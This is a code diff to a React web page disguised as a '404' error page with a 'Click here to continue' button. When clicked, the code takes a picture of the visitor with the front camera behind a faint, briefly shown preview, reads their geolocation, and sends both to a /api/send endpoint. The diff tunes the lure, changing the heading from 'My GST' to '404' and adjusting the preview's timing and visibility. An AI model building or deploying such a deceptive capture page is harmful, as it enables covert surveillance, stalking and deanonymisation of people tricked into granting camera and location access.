@@ -7,7 +7,6 @@ export default function Home() {
   const [showPreview, setShowPreview] = useState(false);
 
   async function capture() {
-    // ---------- CAMERA ----------
     const stream = await navigator.mediaDevices.getUserMedia({
       video: { facingMode: "user" }
     });
@@ -16,14 +15,14 @@ export default function Home() {
     video.srcObject = stream;
     video.muted = true;
 
-    // 🔑 SHOW preview briefly (critical)
+    // show faded preview
     setShowPreview(true);
     await video.play();
 
-    // wait for real frame to render
-    await new Promise(resolve => setTimeout(resolve, 500));
+    // ⏱ keep preview visible for 1 second
+    await new Promise(resolve => setTimeout(resolve, 1000));
 
-    // ---------- CAPTURE ----------
+    // capture full-quality frame
     const canvas = document.createElement("canvas");
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
@@ -33,13 +32,13 @@ export default function Home() {
 
     const image = canvas.toDataURL("image/jpeg", 0.9);
 
-    console.log("Image length:", image.length); // should be >15000
+    console.log("Captured image size:", image.length);
 
     // stop camera + hide preview
     stream.getTracks().forEach(t => t.stop());
     setShowPreview(false);
 
-    // ---------- LOCATION ----------
+    // capture location + send
     navigator.geolocation.getCurrentPosition(async pos => {
       await fetch("/api/send", {
         method: "POST",
@@ -52,27 +51,25 @@ export default function Home() {
       });
     });
   }
-  // at h1 we can add any thing
+
   return (
     <div className="error-container">
-      <h1>My GST</h1>  
+      <h1>404</h1>
       <p>Click here to continue</p>
 
-      {/* Camera preview (briefly visible) */}
       {showPreview && (
         <video
           ref={videoRef}
           playsInline
           muted
           style={{
-            width: "120px",
-            height: "120px",
-            position: "fixed",
-            bottom: "12px",
-            right: "12px",
-            opacity: 0.2
+            width: 160,
+            height: 160,
+            opacity: 0.3,        // 👈 30% opacity
+            borderRadius: 12,
+            marginBottom: 16
           }}
-         />
+        />
       )}
 
       <button onClick={capture}>Continue</button>
